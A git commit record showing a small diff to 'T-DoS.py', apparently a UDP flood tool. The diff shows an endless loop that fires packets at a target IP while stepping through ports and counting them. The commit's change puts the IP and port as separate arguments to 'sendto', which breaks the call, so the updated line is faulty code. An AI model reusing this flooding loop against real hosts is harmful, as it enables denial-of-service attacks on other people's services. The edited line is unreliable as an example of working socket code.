71832555f47641e7679e996c6001f3c3fe222b00
ParzivalKali <82817793+ParzivalHack@users.noreply.github.com>
2022-05-08 15:40:24 +0200

    Update T-DoS.py

--- T-DoS.py
+++ T-DoS.py
@@ -45,7 +45,7 @@ print("[====================] 100%")
 time.sleep(3)
 sent = 0
 while True:
-     sock.sendto(bytes,(ip,port))
+     sock.sendto(bytes,ip,port)
      sent = sent + 1
      port = port + 1
      print("Sent %s packet to %s throught port:%s"%(sent,ip,port))
